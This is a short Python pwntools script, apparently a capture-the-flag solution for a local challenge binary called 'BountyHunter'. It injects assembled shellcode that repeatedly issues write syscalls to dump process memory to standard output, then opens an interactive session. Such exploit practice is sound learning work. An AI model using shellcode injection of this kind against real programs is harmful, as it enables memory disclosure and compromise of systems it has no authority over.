#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./BountyHunter',checksec=False)

context.arch = 'amd64'
p = process()

payload = asm('''
    mov rsi, 0x1000000
    do:
        mov rax, 1
        mov rdi, 1
        mov rdx, 0x1000
        syscall
        add rsi, 0x1000
        jmp do
''')
p.sendline(payload)

p.interactive()
